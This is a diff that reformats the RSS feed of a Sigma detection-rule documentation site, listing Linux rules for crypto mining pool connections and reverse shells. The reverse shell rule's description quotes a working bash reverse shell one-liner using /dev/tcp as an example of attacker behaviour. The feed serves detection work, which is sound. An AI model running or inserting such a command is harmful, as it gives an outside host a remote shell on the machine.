@@ -1,1 +1,29 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>network_connection on My New Hugo Site</title><link>https://bradleyjkemp.dev/sigmadoc/rules/linux/network_connection/</link><description>Recent content in network_connection on My New Hugo Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 26 Oct 2021 08:52:07 +0200</lastBuildDate><atom:link href="https://bradleyjkemp.dev/sigmadoc/rules/linux/network_connection/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Crypto Mining Pool Connections</title><link>https://bradleyjkemp.dev/sigmadoc/rules/linux/network_connection/net_connection_lnx_crypto_mining_indicators.yml/</link><pubDate>Tue, 26 Oct 2021 08:52:07 +0200</pubDate><guid>https://bradleyjkemp.dev/sigmadoc/rules/linux/network_connection/net_connection_lnx_crypto_mining_indicators.yml/</guid><description>&lt;p>Detects process connections to a Monero crypto mining pool&lt;/p></description></item><item><title>Linux Reverse Shell Indicator</title><link>https://bradleyjkemp.dev/sigmadoc/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml/</link><pubDate>Sat, 16 Oct 2021 14:21:55 +0200</pubDate><guid>https://bradleyjkemp.dev/sigmadoc/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml/</guid><description>&lt;p>Detects a bash contecting to a remote IP address (often found when actors do something like &amp;lsquo;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4242 0&amp;gt;&amp;amp;1&amp;rsquo;)&lt;/p></description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>network_connection on My New Hugo Site</title>
+    <link>https://bradleyjkemp.dev/sigmadoc/rules/linux/network_connection/</link>
+    <description>Recent content in network_connection on My New Hugo Site</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 26 Oct 2021 08:52:07 +0200</lastBuildDate><atom:link href="https://bradleyjkemp.dev/sigmadoc/rules/linux/network_connection/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Linux Crypto Mining Pool Connections</title>
+      <link>https://bradleyjkemp.dev/sigmadoc/rules/linux/network_connection/net_connection_lnx_crypto_mining_indicators.yml/</link>
+      <pubDate>Tue, 26 Oct 2021 08:52:07 +0200</pubDate>
+      
+      <guid>https://bradleyjkemp.dev/sigmadoc/rules/linux/network_connection/net_connection_lnx_crypto_mining_indicators.yml/</guid>
+      <description>&lt;p&gt;Detects process connections to a Monero crypto mining pool&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Linux Reverse Shell Indicator</title>
+      <link>https://bradleyjkemp.dev/sigmadoc/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml/</link>
+      <pubDate>Sat, 16 Oct 2021 14:21:55 +0200</pubDate>
+      
+      <guid>https://bradleyjkemp.dev/sigmadoc/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml/</guid>
+      <description>&lt;p&gt;Detects a bash contecting to a remote IP address (often found when actors do something like &amp;lsquo;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4242 0&amp;gt;&amp;amp;1&amp;rsquo;)&lt;/p&gt;</description>
+    </item>
+    
+  </channel>
+</rss>
